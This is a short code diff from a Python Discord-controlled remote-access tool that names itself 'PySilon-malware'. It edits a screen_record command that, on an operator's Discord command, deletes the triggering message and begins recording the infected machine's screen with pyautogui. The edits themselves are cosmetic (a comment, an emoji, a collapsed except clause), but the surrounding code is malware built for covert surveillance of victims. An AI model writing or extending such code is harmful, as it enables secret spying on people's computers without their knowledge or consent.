@@ -9,8 +9,7 @@ async def screen_record(ctx, duration=None):
     if duration != None:
         try:
             duration = int(duration)
-        except:
-            return
+        except: return
         if duration > 60:
             embed = discord.Embed(title="📛 Error",description="Duration interval should not surpass 60 seconds!", colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
@@ -20,9 +19,9 @@ async def screen_record(ctx, duration=None):
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             return await ctx.send(embed=embed)
     else:
-        duration = 15
+        duration = 15 # default duration
     await ctx.message.delete()
-    await ctx.send("`Recording... Please wait.`")
+    await ctx.send("`🟢 Recording... Please wait.`")
 
     output_file = 'recording.mp4'
     screen_width, screen_height = pyautogui.size()
